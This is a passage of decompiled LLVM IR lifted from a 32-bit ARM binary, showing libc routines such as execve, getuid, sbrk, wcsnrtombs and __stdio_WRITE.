  %v4_14b84 = insertvalue [1 x i8*] undef, i8* %v3_14b84, 0
  %v5_14b84 = load i32, i32* @r2, align 4
  %v6_14b84 = inttoptr i32 %v5_14b84 to i8*
  %v7_14b84 = insertvalue [1 x i8*] undef, i8* %v6_14b84, 0
  %v8_14b84 = call i32 @execve(i8* %v1_14b84, [1 x i8*] %v4_14b84, [1 x i8*] %v7_14b84)
  store i32 %v8_14b84, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_14b84, -4095
  br i1 %tmp, label %dec_label_pc_14ba4, label %dec_label_pc_14b94

dec_label_pc_14b94:                               ; preds = %entry
  %v0_14b94 = call i32 @__errno_location()
  %v0_14b98 = load i32, i32* %r4.global-to-local, align 4
  %v1_14b98 = sub i32 0, %v0_14b98
  %v2_14b9c = inttoptr i32 %v0_14b94 to i32*
  store i32 %v1_14b98, i32* %v2_14b9c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14ba4

dec_label_pc_14ba4:                               ; preds = %entry, %dec_label_pc_14b94
  %v0_14ba4 = phi i32 [ %v8_14b84, %entry ], [ -1, %dec_label_pc_14b94 ]
  %v2_14ba8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14ba8, i32* %r4.global-to-local, align 4
  ret i32 %v0_14ba4

; uselistorder directives
  uselistorder i32 %v8_14b84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14ba4, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14bac = load i32, i32* @r4, align 4
  store i32 %v3_14bac, i32* %stack_var_-8, align 4
  %v0_14bb4 = load i32, i32* @r0, align 4
  store i32 %v0_14bb4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14bb4, -4095
  br i1 %tmp, label %dec_label_pc_14bd0, label %dec_label_pc_14bc0

dec_label_pc_14bc0:                               ; preds = %entry
  %v0_14bc0 = call i32 @__errno_location()
  %v0_14bc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_14bc4 = sub i32 0, %v0_14bc4
  %v2_14bc8 = inttoptr i32 %v0_14bc0 to i32*
  store i32 %v1_14bc4, i32* %v2_14bc8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14bd4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14bd0

dec_label_pc_14bd0:                               ; preds = %entry, %dec_label_pc_14bc0
  %v2_14bd4 = phi i32 [ %v3_14bac, %entry ], [ %v2_14bd4.pre, %dec_label_pc_14bc0 ]
  %v0_14bd0 = phi i32 [ %v0_14bb4, %entry ], [ -1, %dec_label_pc_14bc0 ]
  store i32 %v2_14bd4, i32* @r4, align 4
  ret i32 %v0_14bd0

; uselistorder directives
  uselistorder i32 %v0_14bb4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bd0, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14bd8 = load i32, i32* @r4, align 4
  store i32 %v3_14bd8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14bfc, label %dec_label_pc_14bec

dec_label_pc_14bec:                               ; preds = %entry
  %v0_14bec = call i32 @__errno_location()
  %v0_14bf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_14bf0 = sub i32 0, %v0_14bf0
  %v2_14bf4 = inttoptr i32 %v0_14bec to i32*
  store i32 %v1_14bf0, i32* %v2_14bf4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14c00.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14bfc

dec_label_pc_14bfc:                               ; preds = %entry, %dec_label_pc_14bec
  %v2_14c00 = phi i32 [ %v3_14bd8, %entry ], [ %v2_14c00.pre, %dec_label_pc_14bec ]
  %v0_14bfc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14bec ]
  store i32 %v2_14c00, i32* %r4.global-to-local, align 4
  ret i32 %v0_14bfc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bfc, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14c04 = load i32, i32* @r4, align 4
  store i32 %v3_14c04, i32* %stack_var_-8, align 4
  %v0_14c0c = load i32, i32* @r0, align 4
  store i32 %v0_14c0c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14c0c, -4095
  br i1 %tmp, label %dec_label_pc_14c28, label %dec_label_pc_14c18

dec_label_pc_14c18:                               ; preds = %entry
  %v0_14c18 = call i32 @__errno_location()
  %v0_14c1c = load i32, i32* %r4.global-to-local, align 4
  %v1_14c1c = sub i32 0, %v0_14c1c
  %v2_14c20 = inttoptr i32 %v0_14c18 to i32*
  store i32 %v1_14c1c, i32* %v2_14c20, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14c2c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14c28

dec_label_pc_14c28:                               ; preds = %entry, %dec_label_pc_14c18
  %v2_14c2c = phi i32 [ %v3_14c04, %entry ], [ %v2_14c2c.pre, %dec_label_pc_14c18 ]
  %v0_14c28 = phi i32 [ %v0_14c0c, %entry ], [ -1, %dec_label_pc_14c18 ]
  store i32 %v2_14c2c, i32* %r4.global-to-local, align 4
  ret i32 %v0_14c28

; uselistorder directives
  uselistorder i32 %v0_14c0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14c28, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14c30 = load i32, i32* @r4, align 4
  store i32 %v3_14c30, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2f524.834 to i32), i32* %r4.global-to-local, align 4
  %v2_14c38 = load i32, i32* @global_var_2f524.834, align 4
  %v2_14c3c = icmp eq i32 %v2_14c38, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_14c3c, label %dec_label_pc_14c4c, label %dec_label_pc_14c58

dec_label_pc_14c4c:                               ; preds = %entry
  %v2_14c4c = call i32 @__GI_brk(i32* null)
  %v1_14c50 = icmp slt i32 %v2_14c4c, 0
  br i1 %v1_14c50, label %dec_label_pc_14c78, label %dec_label_pc_14c58thread-pre-split

dec_label_pc_14c58thread-pre-split:               ; preds = %dec_label_pc_14c4c
  %v0_14c5c.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_14c58.pre = load i32, i32* @global_var_2f524.834, align 4
  br label %dec_label_pc_14c58

dec_label_pc_14c58:                               ; preds = %dec_label_pc_14c58thread-pre-split, %entry
  %v2_14c58 = phi i32 [ %v2_14c58.pre, %dec_label_pc_14c58thread-pre-split ], [ %v2_14c38, %entry ]
  %v1_14c64 = phi i32 [ %v0_14c5c.pr, %dec_label_pc_14c58thread-pre-split ], [ %arg1, %entry ]
  %v2_14c5c = icmp eq i32 %v1_14c64, 0
  store i32 %v2_14c58, i32* %r4.global-to-local, align 4
  br i1 %v2_14c5c, label %dec_label_pc_14c7c, label %dec_label_pc_14c6c

dec_label_pc_14c6c:                               ; preds = %dec_label_pc_14c58
  %v2_14c64 = add i32 %v1_14c64, %v2_14c58
  %v1_14c6c = inttoptr i32 %v2_14c64 to i32*
  %v2_14c6c = call i32 @__GI_brk(i32* %v1_14c6c)
  %v1_14c70 = icmp slt i32 %v2_14c6c, 0
  br i1 %v1_14c70, label %dec_label_pc_14c78, label %dec_label_pc_14c6c.dec_label_pc_14c7c_crit_edge

dec_label_pc_14c6c.dec_label_pc_14c7c_crit_edge:  ; preds = %dec_label_pc_14c6c
  %v0_14c7c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14c7c

dec_label_pc_14c78:                               ; preds = %dec_label_pc_14c6c, %dec_label_pc_14c4c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14c7c

dec_label_pc_14c7c:                               ; preds = %dec_label_pc_14c6c.dec_label_pc_14c7c_crit_edge, %dec_label_pc_14c58, %dec_label_pc_14c78
  %v0_14c7c = phi i32 [ %v0_14c7c.pre, %dec_label_pc_14c6c.dec_label_pc_14c7c_crit_edge ], [ %v2_14c58, %dec_label_pc_14c58 ], [ -1, %dec_label_pc_14c78 ]
  %v2_14c80 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14c80, i32* @r4, align 4
  ret i32 %v0_14c7c

; uselistorder directives
  uselistorder i32 %v2_14c58, { 1, 0, 2 }
  uselistorder i32* null, { 1, 5, 3, 6, 4, 0, 2, 7, 11, 8, 9, 10, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_14c7c, { 2, 0, 1 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_2d1cc.371 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2d1cc.371, { 1, 0 }
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_14c98 = icmp eq i32 %arg1, 0
  br i1 %v2_14c98, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_14ca0 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_14cc8 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_14cbc = phi i32 [ %arg1, %.thread ], [ %v3_14ca0, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_14cb4 = ptrtoint i32* %stack_var_-16 to i32
  %v2_14cc0 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_14cc0, i32* %stack_var_-16, align 4
  store i32 %v0_14cc8, i32* %stack_var_-12, align 4
  %v5_14cd0 = inttoptr i32 %v0_14cbc to i8*
  %v6_14cd0 = call i32 @__GI_wcsnrtombs(i8* %v5_14cd0, i32 %v2_14cb4, i32 1, i32 16, i32 %arg3)
  %v2_14cd4 = icmp eq i32 %v6_14cd0, 0
  br i1 %v2_14cd4, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_14ce0 = phi i32 [ %v6_14cd0, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_14ce0

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_14cf0 = load i32, i32* @r2, align 4
  store i32 %v0_14cf0, i32* @r3, align 4
  %v0_14cf8 = load i32, i32* @r0, align 4
  %v1_14cf8 = load i32, i32* @r1, align 4
  %v5_14cf8 = inttoptr i32 %v0_14cf8 to i8*
  %v6_14cf8 = call i32 @__GI_wcsnrtombs(i8* %v5_14cf8, i32 %v1_14cf8, i32 -1, i32 %v0_14cf0, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_14cf8
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14d04 = load i32, i32* @r4, align 4
  store i32 %v3_14d04, i32* %stack_var_-8, align 4
  %v10_14d08 = icmp eq i32 %tmp, %arg2
  br i1 %v10_14d08, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_14d101 = load i32, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14d24

bb:                                               ; preds = %entry
  %v4_14d0c = icmp eq i8* %arg1, null
  %v0_14d10 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br i1 %v4_14d0c, label %dec_label_pc_14d24, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14d60

dec_label_pc_14d24:                               ; preds = %.thread, %bb
  %v1_14d64.ph = phi i32 [ %v0_14d10, %bb ], [ %v0_14d101, %.thread ]
  %v2_14d143.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_14d24 = icmp eq i8* %arg1, null
  store i32 %v2_14d143.ph, i32* %ip.global-to-local, align 4
  br i1 %v3_14d24, label %.thread4, label %dec_label_pc_14d58

.thread4:                                         ; preds = %dec_label_pc_14d24
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_14d60

dec_label_pc_14d3c:                               ; preds = %dec_label_pc_14d78
  %v0_14d3c = call i32 @__errno_location()
  store i32 %v0_14d3c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_14d48 = inttoptr i32 %v0_14d3c to i32*
  store i32 84, i32* %v2_14d48, align 4
  %v0_14db4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14db4

dec_label_pc_14d50:                               ; preds = %dec_label_pc_14d88
  %v3_14d8c = zext i8 %v2_14d8c to i32
  store i32 %v3_14d8c, i32* @lr, align 4
  br label %dec_label_pc_14da8

dec_label_pc_14d58:                               ; preds = %dec_label_pc_14d24
  store i32 %v2_14d143.ph, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14d60

dec_label_pc_14d60:                               ; preds = %bb27, %.thread4, %dec_label_pc_14d58
  %v1_14d6420 = phi i32 [ %v0_14d10, %bb27 ], [ %v1_14d64.ph, %.thread4 ], [ %v1_14d64.ph, %dec_label_pc_14d58 ]
  %v2_14d8814 = phi i32 [ %tmp, %bb27 ], [ %v2_14d143.ph, %.thread4 ], [ %v2_14d143.ph, %dec_label_pc_14d58 ]
  %v1_14d60 = load i32, i32* @r3, align 4
  %v3_14d60 = icmp uge i32 %v1_14d6420, %v1_14d60
  %v1_14d60.v1_14d6420 = select i1 %v3_14d60, i32 %v1_14d60, i32 %v1_14d6420
  store i32 %v1_14d60.v1_14d6420, i32* %r4.global-to-local, align 4
  %v1_14d6c = inttoptr i32 %arg2 to i32*
  %v2_14d6c = load i32, i32* %v1_14d6c, align 4
  store i32 %v2_14d6c, i32* @lr, align 4
  store i32 %v1_14d60.v1_14d6420, i32* %r0.global-to-local, align 4
  %v2_14da08 = icmp eq i32 %v1_14d60.v1_14d6420, 0
  br i1 %v2_14da08, label %dec_label_pc_14da8, label %dec_label_pc_14d78

dec_label_pc_14d78:                               ; preds = %dec_label_pc_14d60, %dec_label_pc_14d98.dec_label_pc_14d78_crit_edge
  %v2_14d88 = phi i32 [ %v2_14d98, %dec_label_pc_14d98.dec_label_pc_14d78_crit_edge ], [ %v2_14d8814, %dec_label_pc_14d60 ]
  %v0_14d80 = phi i32 [ %v0_14d78.pre, %dec_label_pc_14d98.dec_label_pc_14d78_crit_edge ], [ %v2_14d6c, %dec_label_pc_14d60 ]
  %v1_14d78 = inttoptr i32 %v0_14d80 to i32*
  %v2_14d78 = load i32, i32* %v1_14d78, align 4
  %v1_14d80 = add i32 %v0_14d80, 4
  store i32 %v1_14d80, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_14d78, 127
  br i1 %tmp36, label %dec_label_pc_14d3c, label %dec_label_pc_14d88

dec_label_pc_14d88:                               ; preds = %dec_label_pc_14d78
  %v1_14d88 = trunc i32 %v2_14d78 to i8
  %v3_14d88 = inttoptr i32 %v2_14d88 to i8*
  store i8 %v1_14d88, i8* %v3_14d88, align 1
  %v0_14d8c = load i32, i32* %ip.global-to-local, align 4
  %v1_14d8c = inttoptr i32 %v0_14d8c to i8*
  %v2_14d8c = load i8, i8* %v1_14d8c, align 1
  %v2_14d90 = icmp eq i8 %v2_14d8c, 0
  br i1 %v2_14d90, label %dec_label_pc_14d50, label %dec_label_pc_14d98

dec_label_pc_14d98:                               ; preds = %dec_label_pc_14d88
  %v1_14d98 = load i32, i32* %r2.global-to-local, align 4
  %v2_14d98 = add i32 %v1_14d98, %v0_14d8c
  store i32 %v2_14d98, i32* %ip.global-to-local, align 4
  %v0_14d9c = load i32, i32* %r0.global-to-local, align 4
  %v1_14d9c = add i32 %v0_14d9c, -1
  store i32 %v1_14d9c, i32* %r0.global-to-local, align 4
  %v2_14da0 = icmp eq i32 %v1_14d9c, 0
  br i1 %v2_14da0, label %dec_label_pc_14da8, label %dec_label_pc_14d98.dec_label_pc_14d78_crit_edge

dec_label_pc_14d98.dec_label_pc_14d78_crit_edge:  ; preds = %dec_label_pc_14d98
  %v0_14d78.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_14d78

dec_label_pc_14da8:                               ; preds = %dec_label_pc_14d98, %dec_label_pc_14d60, %dec_label_pc_14d50
  %v0_14da8 = phi i32 [ %v0_14d8c, %dec_label_pc_14d50 ], [ %v2_14d8814, %dec_label_pc_14d60 ], [ %v2_14d98, %dec_label_pc_14d98 ]
  %v1_14da8 = load i32, i32* @sp, align 4
  %v9_14da8 = icmp eq i32 %v0_14da8, %v1_14da8
  br i1 %v9_14da8, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_14da8
  %v1_14dac = load i32, i32* @lr, align 4
  store i32 %v1_14dac, i32* %v1_14d6c, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_14da8, %bb30
  %v0_14db0 = load i32, i32* %r0.global-to-local, align 4
  %v1_14db0 = load i32, i32* %r4.global-to-local, align 4
  %v2_14db0 = sub i32 %v1_14db0, %v0_14db0
  store i32 %v2_14db0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14db4

dec_label_pc_14db4:                               ; preds = %dec_label_pc_14d3c, %bb31
  %v0_14db4 = phi i32 [ %v0_14db4.pre, %dec_label_pc_14d3c ], [ %v2_14db0, %bb31 ]
  store i32 %v0_14db4, i32* %r0.global-to-local, align 4
  %v2_14dbc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14dbc, i32* %r4.global-to-local, align 4
  ret i32 %v0_14db4

; uselistorder directives
  uselistorder i32 %v0_14db4, { 1, 0 }
  uselistorder i32 %v1_14d9c, { 1, 0 }
  uselistorder i32 %v2_14d98, { 0, 2, 1 }
  uselistorder i32 %v2_14d78, { 1, 0 }
  uselistorder i32 %v2_14d8814, { 1, 0 }
  uselistorder i32 %v1_14d64.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 1, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14db4, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_14d78, { 1, 0 }
  uselistorder label %dec_label_pc_14d60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14d24, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v9_14dc0 = load i32, i32* @r6, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %v2_14dd42 = icmp eq i32 %arg3, 0
  store i1 %v2_14dd42, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_14dd42, label %dec_label_pc_14e74, label %dec_label_pc_14de0

dec_label_pc_14dd4thread-pre-split:               ; preds = %bb22
  %v3_14df8 = load i32, i32* %r7.global-to-local, align 4
  %v5_14df8 = add i32 %v3_14df8, %v3_14dec
  store i32 %v5_14df8, i32* %r7.global-to-local, align 4
  %v5_14dfc = sub i32 %v0_14df4, %v3_14dec
  store i32 %v5_14dfc, i32* @r5, align 4
  %v2_14dd4 = icmp eq i32 %v5_14dfc, 0
  store i1 %v2_14dd4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_14dfc, i32* @r2, align 4
  br i1 %v2_14dd4, label %dec_label_pc_14dd4.dec_label_pc_14e74.loopexit_crit_edge, label %dec_label_pc_14de0

dec_label_pc_14de0:                               ; preds = %entry, %dec_label_pc_14dd4thread-pre-split
  %v0_14de4 = phi i32 [ %v5_14df8, %dec_label_pc_14dd4thread-pre-split ], [ %arg2, %entry ]
  %v0_14de0.in = phi i32 [ %v5_14dfc, %dec_label_pc_14dd4thread-pre-split ], [ %arg3, %entry ]
  %v0_14de0 = icmp slt i32 %v0_14de0.in, 0
  br i1 %v0_14de0, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_14de0
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_14de0, %bb
  store i32 %v0_14de4, i32* @r1, align 4
  %v0_14de8 = load i32, i32* @r4, align 4
  %v1_14de8 = add i32 %v0_14de8, 4
  %v2_14de8 = inttoptr i32 %v1_14de8 to i32*
  %v3_14de8 = load i32, i32* %v2_14de8, align 4
  store i32 %v3_14de8, i32* @r0, align 4
  %v3_14dec = call i32 @__libc_write(i32 %v3_14de8, i32 %v0_14de4)
  store i32 %v3_14dec, i32* %r0.global-to-local, align 4
  %v1_14df0 = icmp slt i32 %v3_14dec, 0
  %v2_14df0 = icmp eq i32 %v3_14dec, 0
  store i1 %v2_14df0, i1* %cpsr_z.global-to-local, align 1
  %v0_14df4 = load i32, i32* @r5, align 4
  store i32 %v0_14df4, i32* @r6, align 4
  br i1 %v1_14df0, label %dec_label_pc_14e04, label %dec_label_pc_14dd4thread-pre-split

dec_label_pc_14e04:                               ; preds = %bb22
  %v0_14e04 = load i32, i32* @r4, align 4
  %v1_14e04 = inttoptr i32 %v0_14e04 to i32*
  %v2_14e04 = load i32, i32* %v1_14e04, align 4
  store i32 %v2_14e04, i32* %r3.global-to-local, align 4
  %v1_14e08 = add i32 %v0_14e04, 8
  store i32 %v1_14e08, i32* %r0.global-to-local, align 4
  %v1_14e0c = inttoptr i32 %v1_14e08 to i32*
  %v2_14e0c = load i32, i32* %v1_14e0c, align 4
  store i32 %v2_14e0c, i32* %r0.global-to-local, align 4
  %v3_14e0c = add i32 %v0_14e04, 12
  %v4_14e0c = inttoptr i32 %v3_14e0c to i32*
  %v5_14e0c = load i32, i32* %v4_14e0c, align 4
  %v1_14e10 = or i32 %v2_14e04, 8
  store i32 %v1_14e10, i32* %r3.global-to-local, align 4
  %v3_14e14 = sdiv i32 %v2_14e04, 256
  %v2_14e18 = sub i32 %v5_14e0c, %v2_14e0c
  store i32 %v2_14e18, i32* %r2.global-to-local, align 4
  %v9_14e18 = icmp eq i32 %v5_14e0c, %v2_14e0c
  store i1 %v9_14e18, i1* %cpsr_z.global-to-local, align 1
  %v1_14e1c = trunc i32 %v3_14e14 to i8
  %v3_14e1c = add i32 %v0_14e04, 1
  %v4_14e1c = inttoptr i32 %v3_14e1c to i8*
  store i8 %v1_14e1c, i8* %v4_14e1c, align 1
  %v0_14e20 = load i32, i32* %r3.global-to-local, align 4
  %v1_14e20 = trunc i32 %v0_14e20 to i8
  %v2_14e20 = load i32, i32* @r4, align 4
  %v3_14e20 = inttoptr i32 %v2_14e20 to i8*
  store i8 %v1_14e20, i8* %v3_14e20, align 1
  %v0_14e24 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14e24, label %dec_label_pc_14e04.dec_label_pc_14e70_crit_edge, label %dec_label_pc_14e28

dec_label_pc_14e04.dec_label_pc_14e70_crit_edge:  ; preds = %dec_label_pc_14e04
  %v0_14e70.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14e70

dec_label_pc_14e28:                               ; preds = %dec_label_pc_14e04
  %v0_14e28 = load i32, i32* %r2.global-to-local, align 4
  %v1_14e28 = load i32, i32* @r5, align 4
  %v9_14e28 = icmp eq i32 %v0_14e28, %v1_14e28
  store i1 %v9_14e28, i1* %cpsr_z.global-to-local, align 1
  %tmp28 = icmp ugt i32 %v0_14e28, %v1_14e28
  br i1 %tmp28, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_14e28
  store i32 %v0_14e28, i32* @r6, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_14e28, %bb23
  %v0_14e30.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_14e34.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb24

bb24:                                             ; preds = %.preheader, %dec_label_pc_14e54
  %v2_14e34 = phi i32 [ %v2_14e34.pre, %.preheader ], [ %v1_14e58, %dec_label_pc_14e54 ]
  %v0_14e30 = phi i32 [ %v0_14e30.pre, %.preheader ], [ %v1_14e40, %dec_label_pc_14e54 ]
  %v1_14e30 = inttoptr i32 %v0_14e30 to i8*
  %v2_14e30 = load i8, i8* %v1_14e30, align 1
  %v3_14e30 = zext i8 %v2_14e30 to i32
  store i32 %v3_14e30, i32* %r3.global-to-local, align 4
  %v3_14e34 = inttoptr i32 %v2_14e34 to i8*
  store i8 %v2_14e30, i8* %v3_14e34, align 1
  %v0_14e38 = load i32, i32* %r0.global-to-local, align 4
  %v1_14e38 = inttoptr i32 %v0_14e38 to i8*
  %v2_14e38 = load i8, i8* %v1_14e38, align 1
  %v3_14e38 = zext i8 %v2_14e38 to i32
  store i32 %v3_14e38, i32* %r3.global-to-local, align 4
  %v7_14e3c = icmp eq i8 %v2_14e38, 10
  store i1 %v7_14e3c, i1* %cpsr_z.global-to-local, align 1
  %v0_14e40 = load i32, i32* %r7.global-to-local, align 4
  %v1_14e40 = add i32 %v0_14e40, 1
  store i32 %v1_14e40, i32* %r7.global-to-local, align 4
  br i1 %v7_14e3c, label %dec_label_pc_14e48, label %dec_label_pc_14e54

dec_label_pc_14e48:                               ; preds = %bb24
  %v0_14e48 = load i32, i32* @r4, align 4
  %v1_14e48 = add i32 %v0_14e48, 1
  %v2_14e48 = inttoptr i32 %v1_14e48 to i8*
  %v3_14e48 = load i8, i8* %v2_14e48, align 1
  %v4_14e48 = zext i8 %v3_14e48 to i32
  store i32 %v4_14e48, i32* %r3.global-to-local, align 4
  %tmp29 = urem i8 %v3_14e48, 2
  %v2_14e4c = icmp eq i8 %tmp29, 0
  store i1 %v2_14e4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14e4c, label %dec_label_pc_14e54, label %dec_label_pc_14e60

dec_label_pc_14e54:                               ; preds = %dec_label_pc_14e48, %bb24
  %v0_14e54 = load i32, i32* @r6, align 4
  %v1_14e54 = add i32 %v0_14e54, -1
  store i32 %v1_14e54, i32* @r6, align 4
  %v7_14e54 = icmp eq i32 %v0_14e54, 1
  store i1 %v7_14e54, i1* %cpsr_z.global-to-local, align 1
  %v1_14e58 = add i32 %v0_14e38, 1
  store i32 %v1_14e58, i32* %r0.global-to-local, align 4
  br i1 %v7_14e54, label %dec_label_pc_14e54.dec_label_pc_14e60_crit_edge, label %bb24

dec_label_pc_14e54.dec_label_pc_14e60_crit_edge:  ; preds = %dec_label_pc_14e54
  %v0_14e60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14e60

dec_label_pc_14e60:                               ; preds = %dec_label_pc_14e48, %dec_label_pc_14e54.dec_label_pc_14e60_crit_edge
  %v0_14e64 = phi i32 [ %v1_14e58, %dec_label_pc_14e54.dec_label_pc_14e60_crit_edge ], [ %v0_14e38, %dec_label_pc_14e48 ]
  %v0_14e60 = phi i32 [ %v0_14e60.pre, %dec_label_pc_14e54.dec_label_pc_14e60_crit_edge ], [ %v0_14e48, %dec_label_pc_14e48 ]
  %v1_14e60 = add i32 %v0_14e60, 8
  %v2_14e60 = inttoptr i32 %v1_14e60 to i32*
  %v3_14e60 = load i32, i32* %v2_14e60, align 4
  store i32 %v3_14e60, i32* %r3.global-to-local, align 4
  %v2_14e64 = add i32 %v0_14e60, 16
  %v3_14e64 = inttoptr i32 %v2_14e64 to i32*
  store i32 %v0_14e64, i32* %v3_14e64, align 4
  %v0_14e68 = load i32, i32* %r3.global-to-local, align 4
  %v1_14e68 = load i32, i32* %r0.global-to-local, align 4
  %v2_14e68 = sub i32 %v1_14e68, %v0_14e68
  store i32 %v2_14e68, i32* %r3.global-to-local, align 4
  %v1_14e6c = load i32, i32* @r5, align 4
